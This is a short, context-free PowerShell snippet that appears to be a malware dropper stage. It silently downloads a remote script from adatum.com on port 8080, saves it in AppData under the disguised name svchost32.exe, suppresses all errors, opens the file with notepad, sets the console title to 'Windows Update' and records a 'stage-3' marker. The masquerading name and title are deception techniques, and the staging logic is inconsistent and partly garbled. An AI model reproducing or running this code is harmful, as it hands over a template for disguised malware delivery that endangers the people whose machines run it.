
Invoke-WebRequest -Uri 'http://adatum.com:8080/stage1.ps1' -OutFile "$env:APPDATA\svchost32.exe" -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "notepad.exe" -ArgumentList "$env:APPDATA\svchost32.exe" -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
$StageMarker = "stage-3"
